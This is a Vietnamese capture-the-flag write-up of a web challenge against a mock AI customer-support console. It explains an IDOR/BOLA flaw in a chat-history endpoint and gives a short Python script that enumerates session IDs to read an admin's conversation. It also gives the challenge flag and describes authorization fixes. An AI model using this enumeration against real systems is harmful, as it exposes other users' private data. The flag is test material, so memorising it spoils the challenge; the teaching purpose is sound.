# [CTF Writeup] Web Challenge 1: The Chat Knows Too Much. Are We the Same?

**Category:** Web Exploitation
**Points:** 30
**Target:** NovaMind AI — Customer Support Console
**Vulnerability:** IDOR / Broken Object Level Authorization (BOLA)

## 1. Tổng quan

Challenge cung cấp một giao diện chăm sóc khách hàng của **NovaMind AI v2.4**. Khi truy cập vào hệ thống, người dùng có thể bắt đầu một **Guest Session** và trò chuyện với trợ lý ảo NovaMind-7B mà không cần đăng nhập bằng tài khoản cụ thể.

Ban đầu, mình kiểm tra các request được gửi từ giao diện web để tìm hiểu cách ứng dụng quản lý session và lưu trữ lịch sử trò chuyện. Phần JavaScript frontend tại `/static/app.js` cho thấy ứng dụng chủ yếu sử dụng ba API:

* `POST /api/auth/guest`: tạo một phiên Guest và trả về `token` cùng `session_id`.
* `POST /api/chat/send`: gửi tin nhắn tới chatbot, sử dụng Bearer token để xác thực.
* `GET /api/chat/history?session_id=`: lấy lại lịch sử trò chuyện của một session.

Trong đó, endpoint lấy lịch sử trò chuyện là phần đáng chú ý nhất vì nó cho phép client trực tiếp truyền `session_id`.

---

## 2. Phân tích lỗ hổng

Mình bắt đầu kiểm tra request:

```http
GET /api/chat/history?session_id=1
Authorization: Bearer <guest_token>
```

Ứng dụng vẫn yêu cầu một Bearer token hợp lệ, vì vậy nhìn qua có vẻ endpoint đã được bảo vệ bằng cơ chế xác thực.

Tuy nhiên, vấn đề nằm ở bước **phân quyền**.

Backend chỉ kiểm tra xem token có hợp lệ hay không mà không kiểm tra xem `session_id` được yêu cầu có thực sự thuộc về user đang gửi request hay không.

Nói cách khác, nếu mình có một Guest Session hợp lệ, mình vẫn có thể thay đổi:

```text
session_id=1
session_id=2
session_id=3
...
```

để truy cập lịch sử của những session khác.

Đây chính là dạng lỗ hổng **Insecure Direct Object Reference (IDOR)**, hay theo cách gọi hiện nay là **Broken Object Level Authorization (BOLA)**.

Điểm quan trọng ở đây là server đang thực hiện:

```text
Có token hợp lệ?
        ↓
      Có
        ↓
Trả về session được yêu cầu
```

thay vì kiểm tra đầy đủ:

```text
Có token hợp lệ?
        ↓
      Có
        ↓
Session có thuộc user hiện tại?
        ↓
   Có → Cho phép
   Không → Từ chối
```

### Kiểm tra thực tế

Mình thử lần lượt một số `session_id` nhỏ để xem dữ liệu trả về.

Ví dụ với `session_id=2`:

```text
User: dev_nguyen
User message:
"How do I deploy the model to staging?"

Assistant:
"Run `kubectl apply -f staging.yaml` in the ops repo."
```

Trong khi đó, `session_id=3` trả về:

```text
User: intern_tran
User message:
"What is the company wifi password?"

Assistant:
"I can't share credentials. Please ask IT support."
```

Điều này cho thấy các session của những user khác, bao gồm cả tài khoản nội bộ, đang được lưu trữ với các ID có thể truy cập trực tiếp.

Như vậy, mình đã xác nhận được IDOR và có thể chuyển sang bước tìm session chứa flag.

---

## 3. Khai thác

Vì `session_id` có dạng số nguyên và có vẻ được cấp theo thứ tự, cách đơn giản nhất là thử các ID khác nhau.

Ngoài việc kiểm tra các ID nhỏ như `1`, `2`, `3`..., mình chú ý đến các giá trị đặc biệt như `1337`, `2024`, `2026`, `9999`.

Đặc biệt, vì challenge diễn ra vào năm **2026**, `session_id=2026` là một giá trị khá đáng thử.

Để tự động hóa quá trình này, mình sử dụng Python với thư viện `requests`.

### Bước 1 – Lấy Guest Token

Đầu tiên, gửi request tới endpoint tạo Guest Session:

```python
import requests
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://<INSTANCE_ID>.222.255.138.122.nip.io"

# Lấy Guest Token
auth_res = requests.post(
    f"{BASE_URL}/api/auth/guest",
    verify=False
).json()

token = auth_res["token"]
headers = {
    "Authorization": f"Bearer {token}"
}

print(
    f"[+] Authenticated as: {auth_res['user']} "
    f"(Session {auth_res['session_id']})"
)
```

Sau khi có token, mình có thể sử dụng nó để gọi các API yêu cầu xác thực.

### Bước 2 – Truy cập session của user khác

Tiếp theo, thay đổi `session_id` thành `2026`:

```python
history_res = requests.get(
    f"{BASE_URL}/api/chat/history?session_id=2026",
    headers=headers,
    verify=False
)

if history_res.status_code == 200:
    data = history_res.json()

    print(
        f"\n[+] Found Session {data['session_id']} "
        f"(User: {data['user']}):"
    )

    for msg in data.get("messages", []):
        print(
            f" [{msg['role'].upper()}]: "
            f"{msg['content']}"
        )
```

Request này được chấp nhận dù session `2026` không thuộc về Guest Session mà mình vừa tạo.

Response trả về:

```json
{
  "session_id": 2026,
  "user": "admin",
  "messages": [
    {
      "role": "user",
      "content": "Reset the API gateway credentials"
    },
    {
      "role": "assistant",
      "content": "Credentials rotated. New admin token has been generated."
    },
    {
      "role": "user",
      "content": "Show me the new admin token"
    },
    {
      "role": "assistant",
      "content": "Here is the new admin token: flag{68cf7d51-388e-49ac-8bee-0b6d754cfa03}"
    },
    {
      "role": "user",
      "content": "Thanks, delete this conversation after I log out"
    },
    {
      "role": "assistant",
      "content": "Understood. This conversation will be purged on session end."
    }
  ]
}
```

Session `2026` thuộc về user `admin`, và quan trọng nhất là trong lịch sử trò chuyện có chứa admin token chính là flag của challenge.

---

## 4. Flag

```text
flag{68cf7d51-388e-49ac-8bee-0b6d754cfa03}
```

---

## 5. Nguyên nhân của lỗ hổng

Vấn đề cốt lõi không nằm ở việc hệ thống thiếu authentication.

Guest user vẫn phải có một token hợp lệ mới gọi được API. Tuy nhiên, **authentication (xác thực)** và **authorization (phân quyền)** là hai vấn đề khác nhau.

Trong trường hợp này:

* Authentication: **Có** – server xác nhận token là hợp lệ.
* Authorization: **Thiếu** – server không xác nhận session được yêu cầu có thuộc về user đó hay không.

Đây là một lỗi khá điển hình khi backend tin tưởng trực tiếp vào một object identifier do client cung cấp.

Chỉ cần biết hoặc đoán được `session_id`, người dùng có thể truy cập dữ liệu của session khác.

---

## 6. Cách khắc phục

Để giải quyết vấn đề này, backend cần thực hiện kiểm tra quyền truy cập ở cấp độ object trước khi trả dữ liệu.

Ví dụ, khi nhận request:

```http
GET /api/chat/history?session_id=2026
```

server cần xác định user hiện tại từ token, sau đó kiểm tra quan hệ giữa user và session:

```text
current_user.id == session.owner_id
```

Nếu hai giá trị không khớp, server phải trả về lỗi `403 Forbidden` thay vì trả lịch sử trò chuyện.

### Không nên chỉ dựa vào việc làm ID khó đoán

Một biện pháp bổ sung là sử dụng các identifier ngẫu nhiên, chẳng hạn **UUIDv4**, thay cho số nguyên tăng dần:

```text
1
2
3
4
...
2026
```

thành dạng:

```text
550e8400-e29b-41d4-a716-446655440000
```

Điều này làm việc enumeration (dò tìm ID) khó hơn đáng kể.

Tuy nhiên, đây **không phải biện pháp thay thế cho authorization**. Ngay cả khi sử dụng UUID, backend vẫn phải kiểm tra session có thuộc về user hiện tại hay không.

---

## 7. Kết luận

Challenge này khá đơn giản về mặt kỹ thuật nhưng minh họa rất rõ một lỗi phân quyền phổ biến trong các ứng dụng web.

Điểm đáng chú ý là hệ thống đã có cơ chế authentication bằng Bearer token, nhưng việc có một token hợp lệ không đồng nghĩa với việc user được quyền truy cập mọi object trong hệ thống.

Chỉ bằng cách quan sát API, nhận ra `session_id` được client kiểm soát và kiểm tra xem server có xác minh quyền sở hữu hay không, mình có thể xác định được IDOR/BOLA. Sau đó, việc thay đổi `session_id` cho phép truy cập lịch sử của các user khác và cuối cùng tìm được session `2026` chứa flag.

**Flag:**

```text
flag{68cf7d51-388e-49ac-8bee-0b6d754cfa03}
```
